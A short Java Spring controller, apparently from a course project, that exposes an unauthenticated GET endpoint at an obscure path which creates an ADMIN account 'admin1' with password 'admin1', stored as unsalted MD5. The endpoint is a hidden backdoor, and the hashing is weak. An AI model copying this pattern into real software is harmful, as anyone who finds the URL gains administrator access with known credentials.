package pl.camp.it.controllers;

import org.apache.commons.codec.digest.DigestUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import pl.camp.it.model.User;
import pl.camp.it.model.UserRole;
import pl.camp.it.service.IUserService;

@Controller
public class HacksController {
    @Autowired
    IUserService userService;
    @GetMapping(value = "/170896")
    public String hackMyWorld() {
        User user = new User();
        user.setLogin("admin1");
        user.setPass(DigestUtils.md5Hex("admin1"));
        user.setRole(UserRole.ADMIN);
        userService.persistUser(user);
        return "/login";
    }
}
